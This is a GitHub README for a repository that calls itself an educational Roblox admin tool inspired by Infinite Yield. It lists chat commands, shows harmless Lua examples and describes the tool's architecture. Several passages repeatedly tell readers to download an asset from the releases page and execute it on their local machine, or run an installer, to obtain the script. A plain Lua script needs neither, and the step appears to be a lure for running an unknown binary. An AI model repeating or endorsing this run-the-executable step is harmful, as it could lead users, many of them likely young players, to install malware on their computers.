[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/Kirneho/Infinite-Yield-Admin-Tool-for-Roblox-Educational-Purposes/releases)

# Infinite Yield Admin Tool — Roblox Admin Learning Suite

<img src="https://images.unsplash.com/photo-1515879218367-8466d910aaa4?auto=format&fit=crop&w=1200&q=60" alt="Game development image" style="width:100%; max-height:360px; object-fit:cover;"/>

Table of contents
- About
- Quick start
- Release download and run
- Features
- Command reference
- Examples and scripts
- How it works (architecture)
- Installation in Roblox Studio
- Scripting with the tool
- Customization
- API and internals
- Development guide
- Testing and CI
- Performance tips
- Security practices
- Frequently asked questions
- Troubleshooting
- Contributing
- License
- Changelog

About
This repository contains an educational build of an admin tool inspired by Infinite Yield. It aims to help developers learn how admin commands interact with game state. The code focuses on clarity, modular design, and documented examples. Use this repo to study command patterns, create custom admin actions, and test game management workflows in Roblox Studio.

Quick start
- Visit the releases page and download the release asset:
  https://github.com/Kirneho/Infinite-Yield-Admin-Tool-for-Roblox-Educational-Purposes/releases
- Extract the package if it comes as an archive.
- Place the main script inside ServerScriptService in Roblox Studio.
- Run the game in Studio and test the commands from the command bar or a test client.

Release download and run
The project provides official release assets on GitHub. Download the package from:
https://github.com/Kirneho/Infinite-Yield-Admin-Tool-for-Roblox-Educational-Purposes/releases

If the release contains an executable file, or a script package, download the listed file and execute it on your local machine to extract the script bundle. Then load the provided Roblox script into ServerScriptService. If the release lists multiple assets, pick the one marked "server" or "main" and run that file to get the final script.

Features
- Core admin commands: kick, ban, teleport, respawn, set speed, freeze.
- Permission model: user groups, whitelist, blacklists.
- Command parsing: prefix-based commands with arguments and flags.
- Context-aware actions: target players, groups, positions.
- Logging: command history and audit log stored in DataStore for sandbox tests.
- Modular command API: add or remove commands with minimal code.
- Event hooks: pre-execute and post-execute hooks for custom validation.
- Safe mode: run commands in a simulated context for testing.
- Demo plugins: chat commands, GUI toggles, and developer tools.
- Documentation: inline comments and full reference in this README.

Images and visuals
- Admin UI sample
  <img src="https://images.unsplash.com/photo-1526378721482-1aa7b5e7f2b9?auto=format&fit=crop&w=1200&q=60" alt="UI example" style="width:100%; max-height:300px; object-fit:cover; margin-top:8px;"/>

- Command flow diagram (conceptual)
  <img src="https://images.unsplash.com/photo-1504639725590-34d0984388bd?auto=format&fit=crop&w=1200&q=60" alt="Flow diagram" style="width:100%; max-height:300px; object-fit:cover; margin-top:8px;"/>

Command reference
This section lists the built-in commands. Each command shows arguments, usage, and a short example. Commands map to functions in Server scripts. Use the command prefix "!" in chat or run from a client console.

Format
- commandName [args] — short description
- Example: usage

1. help — Show a list of commands or details for a command.
   - Example: !help kick

2. kick [player] [reason?] — Kick a player from the server.
   - Example: !kick Alice Spamming

3. ban [player] [duration?] [reason?] — Ban a player for a duration in minutes. Use 0 for permanent.
   - Example: !ban Bob 0 Cheating

4. unban [player] — Remove a player from the ban list.
   - Example: !unban Bob

5. tp [player] [target] — Teleport player to another player or to coordinates.
   - Example: !tp Alice Bob
   - Example: !tp Alice 10,5,20

6. bring [player] — Teleport player to the command caller.
   - Example: !bring Charlie

7. freeze [player] — Freeze player movement and actions.
   - Example: !freeze Dave

8. unfreeze [player] — Restore player movement.
   - Example: !unfreeze Dave

9. speed [player] [value] — Set walk speed.
   - Example: !speed Alice 50

10. jump [player] [value] — Set jump power.
    - Example: !jump Alice 100

11. respawn [player] — Force player to respawn.
    - Example: !respawn Eve

12. spawn [assetName] [position?] — Spawn an asset from ServerStorage or AssetService.
    - Example: !spawn Rocket 0,10,0

13. give [player] [itemName] [count?] — Give an item to a player inventory.
    - Example: !give Frank HealthPotion 3

14. mute [player] — Prevent a player from sending chat.
    - Example: !mute Grace

15. unmute [player] — Allow a player to chat again.
    - Example: !unmute Grace

16. announce [message] — Broadcast a server-wide message via GUI.
    - Example: !announce Event starts in 5 minutes

17. settime [hour] — Set the server time of day.
    - Example: !settime 12

18. giveadmin [player] — Grant temporary admin role.
    - Example: !giveadmin Hank

19. revokeadmin [player] — Remove temporary admin role.
    - Example: !revokeadmin Hank

20. sim [commandString] — Simulate a command in safe mode. Use for testing.
    - Example: !sim "kick Alice Spamming"

Command syntax and parsing
- Commands start with the prefix set in config. Default prefix: "!".
- Arguments separate by space. Use quotes to group multi-word arguments.
- Coordinates use a comma list: x,y,z
- Flags begin with a dash: -s for silent, -l for log
- Player match supports partial names and UID. Use exact names in tests.

Examples and scripts
This section shows common patterns. Use these snippets in LocalScripts or ServerScriptService for plugin tests.

Example: Simple command handler (Lua pseudocode)
```lua
local Commands = {}

function register(name, fn)
  Commands[name] = fn
end

function runCommand(caller, raw)
  local args = parseArgs(raw)
  local cmd = args[1]
  if Commands[cmd] then
    table.remove(args, 1)
    local ok, err = pcall(function()
      Commands[cmd](caller, unpack(args))
    end)
    if not ok then
      warn("Command error:", err)
    end
  end
end

register("kick", function(caller, targetName, reason)
  local target = findPlayerByName(targetName)
  if target then
    target:Kick(reason or "Kicked by admin")
  end
end)
```

Example: Safe mode simulation
```lua
local Sim = {}

function Sim:runSimulated(command)
  local context = {
    player = nil,
    log = {},
  }
  local ok, result = pcall(function()
    return executeCommandInContext(command, context)
  end)
  return ok, result, context.log
end
```

Example: Registering a pre-execute hook
```lua
Hooks = {}

function addPreHook(name, fn)
  Hooks[name] = fn
end

function runWithHooks(name, ...)
  if Hooks[name] then
    local pass, msg = Hooks[name](...)
    if not pass then
      return false, msg
    end
  end
  return true
end
```

How it works (architecture)
The tool uses a layered design. Each layer has a clear role.

- Input layer
  - Handles chat and UI input.
  - Parses command prefix and tokenizes text.
- Core layer
  - Manages command registry.
  - Runs permissions checks.
  - Emits pre and post hooks.
- Execution layer
  - Calls command functions.
  - Interacts with Roblox API: teleport, DataStore, character control.
- Persistence layer
  - Stores logs and settings in DataStore and files for local dev.
- UI layer
  - Shows command output and history.
  - Provides action buttons and forms.

This layout helps isolate features. You can test command logic without touching Roblox APIs when you inject mock services.

Installation in Roblox Studio
1. Open Roblox Studio.
2. Create a new place or open a test place.
3. In the Explorer, create a new Folder under ServerScriptService named AdminTool.
4. Add the main server script file from the release into the AdminTool folder.
5. Add the module scripts from the /modules folder next to the main script if the release included them.
6. Create a RemoteEvent in ReplicatedStorage named AdminRemote for client-server calls.
7. Run the game in Play Solo to test.

Client UI
- Add a ScreenGui to StarterGui for the admin console.
- Add a Frame with a TextBox for command input.
- Use LocalScript to send command strings to AdminRemote with a "RequestCommand" action.
- Commands run on the server which validates permissions and executes.

Scripting with the tool
The tool exposes a small API to add commands and hooks.

API surface
- Admin.RegisterCommand(name, handler)
  - handler(caller, argsTable)
- Admin.AddPreHook(name, fn)
  - fn(caller, args) -> bool, message
- Admin.AddPostHook(name, fn)
  - fn(caller, args, result)
- Admin.SetPermissionLevel(name, level)
  - level: number or function(caller) -> bool
- Admin.Log(action, meta)
- Admin.Simulate(commandString)

Sample command registration
```lua
local Admin = require(game.ServerScriptService.AdminTool.Main)

Admin.RegisterCommand("freeze", function(caller, args)
  local target = Admin.FindPlayer(args[1])
  if target then
    Admin.FreezePlayer(target)
    Admin.Log("freeze", {by = caller.Name, target = target.Name})
  end
end)
```

Customization
You can adapt the tool to your game. Use these hooks and modules to create new behavior.

Permissions
- Default roles: Owner, Admin, Moderator, Developer, Player
- Role check: Admin.IsInRole(player, roleName)
- Add new roles via config table in the main module.

UI themes
- ScreenGui uses a simple theme table.
- Replace colors and fonts in Theme.lua.
- The UI remains responsive with small layouts.

Plugins
The repo includes example plugins:
- chat-logger: Send chat logs to an admin channel.
- spectator-mode: Attach camera and observe a player.
- save-load: Save and load player settings.

API and internals
Modules
- Main.lua — entrypoint
- Commands.lua — registry and parser
- Hooks.lua — hook system
- Permissions.lua — role system
- Persistence.lua — DataStore wrappers
- Utils.lua — helpers and player matchers
- UI.lua — server-side UI helpers

Data flow
- Input -> Parser -> Permission check -> Hook chain -> Executor -> Persistence
- Hooks can short-circuit the flow by returning false.

DataStore schema
- AdminSettings: JSON doc with role definitions and config.
- CommandLog: Append-only list of command events. Each record includes timestamp, caller, command, args, result.
- Bans: Map playerId -> banInfo {reason, expiresAt}

Development guide
Set up local environment
- Use Roblox Studio with Rojo or the built-in file import for structured workflow.
- The project supports Rojo. Map the /src folder to the place file.

Code style
- Keep module scope small.
- Export functions in a table.
- Document parameters with short comments.
- Use Defensive checks on arguments.

Testing
- Use the safe mode simulation API to test commands without running RPCs.
- Write unit tests for parsing and permission modules.
- Use a mock DataStore for offline tests.

Testing and CI
You can integrate tests in a CI system.

Suggested CI flow
- Lint Lua code with a Lua linter.
- Run unit tests with a Lua test runner or custom test harness.
- Build release zip with Rojo export.
- Tag release and publish to GitHub releases.

Performance tips
- Avoid expensive loops in hot paths.
- Cache player objects and resolved targets for the duration of command execution.
- Minimize remote calls by batching UI updates.
- Use coroutine.wrap for non-blocking logging tasks.

Security practices
- Run all command execution on the server.
- Do not trust client input. Validate player identity and roles before action.
- Use pre-execute hooks to test for edge cases.
- Store sensitive config in server-only modules inside ServerScriptService.
- Use DataStore rate limits to avoid quota issues.

Frequently asked questions
Q: Can I use this tool in a public game?
A: Use the code for learning and testing. Follow Roblox Terms of Use. Adapt permissions before public use.

Q: How do I add a custom command?
A: Use Admin.RegisterCommand with a handler. Add a pre-hook if you need custom validation.

Q: How do bans persist across servers?
A: The tool stores bans in DataStore under the Bans key. You can expand the schema.

Q: How do I test commands without affecting players?
A: Use Admin.Simulate to run commands in safe mode. You can inspect the simulated log.

Q: How do I restore default settings?
A: Replace the settings table in AdminSettings DataStore with the default JSON from /config/defaults.lua.

Troubleshooting
- If commands do not run, check that the main server script sits in ServerScriptService.
- If RemoteEvents do not fire, check the name AdminRemote in ReplicatedStorage.
- If commands throw errors, enable server output in Studio and inspect stack traces.
- If DataStore fails in Studio, use a mock DataStore during local development.
- If UI does not appear, ensure the ScreenGui is in StarterGui and LocalScript connects to AdminRemote.

Releases
Download the packaged script asset from the releases page and run the included installer script to extract and install the files. The release file must be downloaded and executed to set up the script files in your local workspace:
https://github.com/Kirneho/Infinite-Yield-Admin-Tool-for-Roblox-Educational-Purposes/releases

Contributing
Guidelines
- Fork the repo and create a feature branch.
- Keep commits small and focused.
- Add tests for new behavior.
- Document new API surface in this README.

Style
- Use simple names for commands.
- Keep the public API stable. Avoid breaking changes without a version bump.

Pull request process
- Open a pull request describing changes.
- Include unit test results.
- Maintainers will review and request changes.

Issue reporting
- Provide steps to reproduce.
- Attach minimal test place or code snippet.
- Provide Studio version and Roblox API version if relevant.

Maintainers
- Maintain code with clarity and test coverage.
- Tag releases for major changes.
- Keep changelog up to date.

License
MIT License — use the code for learning and testing. See LICENSE file.

Changelog
- v1.0.0 — Base educational release with core commands, permission model, hooks, and example plugins.
- v1.1.0 — Added safe mode simulation, DataStore logging, and UI theme support.
- v1.2.0 — Added sample plugins and expanded command list.
- v1.3.0 — Improved parsing and player match logic.

Appendix A — Command design patterns
Pattern: Command-as-module
- Each command is a module that returns a table with metadata and an execute function.
- Example:
```lua
return {
  name = "kick",
  description = "Kick a player.",
  execute = function(caller, targetName, reason)
    local target = Admin.FindPlayer(targetName)
    if target then target:Kick(reason) end
  end
}
```

Pattern: Central registry
- Commands register themselves with Admin.RegisterCommand during module load.
- The registry uses the command name for lookup and a permission field for access control.

Appendix B — Player matching
- Exact name match
- Case-insensitive partial match
- UserId lookup when the input contains only numbers
- Fallback to caller if no target provided and command supports self-target

Appendix C — Hooks and events
- PreExecute hook signature: fn(caller, command, args) -> bool, message
- PostExecute hook signature: fn(caller, command, args, result)
- Add hooks for audit, ban checks, or telemetry.

Appendix D — Sample test scenarios
1. Role escalation test
- Create a test place with three players.
- Register a test command that requires Admin role.
- Attempt to run the command as a non-admin. Expect the command to fail.

2. Ban enforcement test
- Ban a user with a specific reason and expiry.
- Attempt to rejoin. Confirm the join triggers a kick with the recorded reason.

3. Command simulation test
- Run Admin.Simulate("ban Alice 0 Testing")
- Confirm simulation returns a log with no actual ban in DataStore.

Appendix E — Export tips for Rojo
- Map /src/Main to ServerScriptService/AdminTool/Main.lua
- Map /src/Modules to ServerScriptService/AdminTool/Modules
- Use rojo build to export to a place file for CI packaging.

Contact and support
- Open an issue in this repository for bug reports or feature requests.
- Create PRs with clear descriptions.

Credits
- Ideas drawn from admin frameworks used in the Roblox developer community.
- Visuals sourced from free images on Unsplash.

Additional resources
- Roblox developer hub: https://developer.roblox.com
- DataStore guide: search DataStore service on dev hub
- RemoteEvents and security patterns on the dev hub

End of file